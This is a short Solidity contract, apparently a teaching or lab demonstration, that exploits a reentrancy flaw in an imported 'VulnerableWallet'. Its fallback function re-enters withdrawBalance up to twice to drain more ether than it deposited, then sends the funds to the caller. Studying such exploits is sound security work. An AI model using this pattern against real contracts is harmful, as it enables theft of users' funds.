pragma solidity ^0.5.8;

import "./VulnerableWallet.sol";


contract MaliciousWallet {
    uint private iterations = 0;
    Wallet wallet;

    constructor(address walletAddress) public {
        wallet = Wallet(walletAddress);
    }

    function deposit() external payable {
        wallet.deposit.value(msg.value)();
    }

    function withdraw() external payable {
        iterations = 0;
        wallet.withdrawBalance();
        msg.sender.transfer(address(this).balance);
    }

    function() external payable{
        if (iterations < 2) {
            iterations += 1;
            wallet.withdrawBalance();
        }
    }
}
